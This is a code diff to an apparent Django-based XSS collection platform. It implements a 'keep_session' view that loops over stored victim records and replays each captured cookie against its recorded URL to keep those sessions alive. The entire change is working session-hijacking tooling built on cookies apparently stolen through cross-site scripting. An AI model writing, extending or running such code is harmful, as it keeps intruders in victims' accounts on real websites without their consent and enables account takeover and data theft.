@@ -1,5 +1,6 @@
 #coding=utf-8
 import json
+import urllib2
 from django.contrib.auth.models import User
 from django.contrib.auth.decorators import login_required
 from django.http import HttpResponse, Http404, HttpResponseRedirect, HttpResponseForbidden
@@ -130,7 +131,19 @@ def func_test(request):
 
 
 def keep_session(request):
-    pass
+    p = XssProject.objects.filter(keep_session=True)
+    for item in p:
+        for record in item.records.all():
+            try:
+                req = urllib2.Request(record.url)
+                req.add_header("cookie", record.cookie)
+                response = urllib2.urlopen(req)
+                print response.read()
+            except urllib2.URLError:
+                pass
+
+    return HttpResponse("success")
+
 
 
 
